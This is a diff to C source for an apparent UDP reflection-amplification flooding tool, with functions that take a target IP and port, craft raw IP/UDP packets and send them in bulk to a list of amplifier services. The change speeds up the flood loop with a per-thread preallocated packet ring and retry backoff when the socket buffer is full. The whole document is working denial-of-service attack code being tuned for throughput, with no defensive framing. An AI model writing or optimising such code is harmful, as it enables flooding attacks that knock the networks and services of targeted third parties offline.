@@ -5,6 +5,7 @@
 #include <time.h>
 #include <errno.h>
 #include <unistd.h>
+#include <sched.h>
 #include <arpa/inet.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
@@ -276,6 +277,12 @@ EXPORT int amp_bank_init(int sock, uint32_t target_ip, uint16_t target_port) {
     return 0;
 }
 
+/* Thread-local pre-allocated buffer ring — zero malloc/free in hot path */
+#define AMP_RING_SLOTS AMP_BURST
+#define AMP_RING_PKT_SZ (sizeof(struct iphdr) + sizeof(struct udphdr) + AMP_MAX_PAYLOAD + 64)
+
+static __thread unsigned char g_amp_pkt_ring[AMP_RING_SLOTS][AMP_RING_PKT_SZ];
+
 static int amp_flood_internal(int sock, int protos, int packets) {
     if (protos <= 0 || protos > (int)NUM_AMPLIFIERS) protos = NUM_AMPLIFIERS;
     unsigned char buf[AMP_MAX_PAYLOAD];
@@ -294,15 +301,15 @@ static int amp_flood_internal(int sock, int protos, int packets) {
                 continue;
 
             uint16_t dport = g_amplifiers[pi].port;
-            unsigned char *pkt = malloc(len + sizeof(struct iphdr) + sizeof(struct udphdr));
-            if (!pkt) continue;
+            unsigned char *pkt = g_amp_pkt_ring[batch];
 
+            memset(pkt, 0, sizeof(struct iphdr) + sizeof(struct udphdr));
             struct iphdr *ip = (struct iphdr *)pkt;
             struct udphdr *udp = (struct udphdr *)(pkt + sizeof(struct iphdr));
 
-            memset(pkt, 0, sizeof(struct iphdr) + sizeof(struct udphdr));
+            int pkt_len = len + sizeof(struct iphdr) + sizeof(struct udphdr);
             ip->ihl = 5; ip->version = 4;
-            ip->tot_len = htons((uint16_t)(len + sizeof(struct iphdr) + sizeof(struct udphdr)));
+            ip->tot_len = htons((uint16_t)pkt_len);
             ip->id = htons((uint16_t)(amp_rand() & 0xFFFF));
             ip->frag_off = htons(0x4000);
             ip->ttl = 128; ip->protocol = IPPROTO_UDP;
@@ -322,7 +329,7 @@ static int amp_flood_internal(int sock, int protos, int packets) {
             addrs[batch].sin_port = htons(dport);
 
             iovecs[batch].iov_base = pkt;
-            iovecs[batch].iov_len = ntohs(ip->tot_len);
+            iovecs[batch].iov_len = pkt_len;
             msgs[batch].msg_hdr.msg_name = &addrs[batch];
             msgs[batch].msg_hdr.msg_namelen = sizeof(addrs[batch]);
             msgs[batch].msg_hdr.msg_iov = &iovecs[batch];
@@ -331,14 +338,17 @@ static int amp_flood_internal(int sock, int protos, int packets) {
         }
         if (batch == 0) continue;
 
-        int off = 0, rem = batch;
+        int off = 0, rem = batch, eagain_cnt = 0;
         while (rem > 0) {
             int ret = (int)sendmmsg(sock, msgs + off, rem, MSG_DONTWAIT);
-            if (ret > 0) { off += ret; rem -= ret; total += ret; }
-            else if (errno == EAGAIN || errno == EWOULDBLOCK) continue;
-            else break;
+            if (ret > 0) { off += ret; rem -= ret; total += ret; eagain_cnt = 0; }
+            else if (errno == EAGAIN || errno == EWOULDBLOCK) {
+                eagain_cnt++;
+                if (eagain_cnt < 10) { sched_yield(); }
+                else { struct timespec ts = {0, 100 * 1000L}; nanosleep(&ts, NULL); }
+                continue;
+            } else break;
         }
-        for (int j = 0; j < batch; j++) free(iovecs[j].iov_base);
     }
     return total;
 }
